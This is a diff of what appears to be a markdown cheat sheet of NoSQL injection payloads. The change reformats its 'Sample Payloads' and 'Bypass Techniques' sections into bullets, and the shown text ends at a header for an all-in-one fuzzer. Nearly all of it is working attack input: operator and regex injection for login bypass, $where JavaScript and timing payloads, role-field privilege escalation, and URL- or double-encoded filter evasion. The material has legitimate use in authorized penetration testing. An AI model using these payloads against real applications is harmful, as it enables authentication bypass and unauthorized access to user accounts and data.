@@ -3849,27 +3849,27 @@ NoSQL injection occurs when an attacker manipulates queries by injecting malicio
 
 # **2. Sample Payloads (Test Inputs)**
 
-**2.1 Basic Operator Injection: username=admin&password[$ne]=null,   { "username": { "$ne": null }, "password": { "$ne": null } }
-**2.2 Authentication Bypass Payloads:   username=admin&password[$gt]=0,   password[$exists]=true
-**2.3 Regex Injection:  username=admin&password[$regex]=.*    password[$regex]=^a
-**2.4 Blind Injection Payloads:  username=admin&password[$regex]=^(?=.{1,}).*,    Timing-based:  $where=sleep(5000)
-**2.5 $where JavaScript Injection:  {"$where": "this.password.length > 0"},   {"$where": "function() { return true; }"}
-**2.6 Array-Based Injection:   username[]=admin,   password[]=123
-**2.7 Type Confusion Payloads:  username=true,  password=0
-**2.8 Privilege Escalation Payloads: role[$ne]=user,   {"role": {"$in": ["admin", "superuser"]}}
+- **2.1 Basic Operator Injection: username=admin&password[$ne]=null, { "username": { "$ne": null }, "password": { "$ne": null } } 
+- **2.2 Authentication Bypass Payloads: username=admin&password[$gt]=0, password[$exists]=true 
+- **2.3 Regex Injection: username=admin&password[$regex]=. password[$regex]=^a 
+- **2.4 Blind Injection Payloads: username=admin&password[$regex]=^(?=.{1,}).*, Timing-based: $where=sleep(5000) 
+- **2.5 $where JavaScript Injection: {"$where": "this.password.length > 0"}, {"$where": "function() { return true; }"} 
+- **2.6 Array-Based Injection: username[]=admin, password[]=123 
+- **2.7 Type Confusion Payloads: username=true, password=0 
+- **2.8 Privilege Escalation Payloads: role[$ne]=user, {"role": {"$in": ["admin", "superuser"]}}
 
 # **3. Bypass Techniques (Advanced)**
 
-**3.1 Operator Obfuscation Bypass:  password[%24ne]=null,    password[$n%e]=null
-**3.2 JSON Structure Manipulation:  { "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] }
-**3.3 Array Injection Bypass:  username=admin&password[$in][]=anything
-**3.4 Encoded Injection:  URL-encoded:   password%5B%24ne%5D=null,   Double-encoded:  password%255B%2524ne%255D=null
-**3.5 Regex Bypass Variants:    ,password[$regex]=.*  ,password[$regex]=^.*   ,password[$regex]=(?s).*    ,password[$regex]=.{0,100}
-**3.6 JavaScript Bypass (MongoDB):   $where=1==1,   $where=function(){return(true);}
-**3.7 Numeric/String Type Abuse:   "role": 1,  "role": "1",  Backend may treat numbers as admin flags.
-**3.8 Boolean-Type Bypass:  "username": true,   "password": false
-**3.9 Logical Injection ($or / $and):   { "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] },   { "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] }
-**3.10 Null Injection:  { "username": null }
+- **3.1 Operator Obfuscation Bypass: password[%24ne]=null, password[$n%e]=null 
+- **3.2 JSON Structure Manipulation: { "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] } 
+- **3.3 Array Injection Bypass: username=admin&password[$in][]=anything 
+- **3.4 Encoded Injection: URL-encoded: password%5B%24ne%5D=null, Double-encoded: password%255B%2524ne%255D=null 
+- **3.5 Regex Bypass Variants: ,password[$regex]=. ,password[$regex]=^. ,password[$regex]=(?s). ,password[$regex]=.{0,100} 
+- **3.6 JavaScript Bypass (MongoDB): $where=1==1, $where=function(){return(true);} 
+- **3.7 Numeric/String Type Abuse: "role": 1, "role": "1", Backend may treat numbers as admin flags. 
+- **3.8 Boolean-Type Bypass: "username": true, "password": false 
+- **3.9 Logical Injection ($or / $and): { "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] }, { "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] } 
+- **3.10 Null Injection: { "username": null }
 
 # **4. Combined Master Payload (All-In-One Fuzzer)**
 
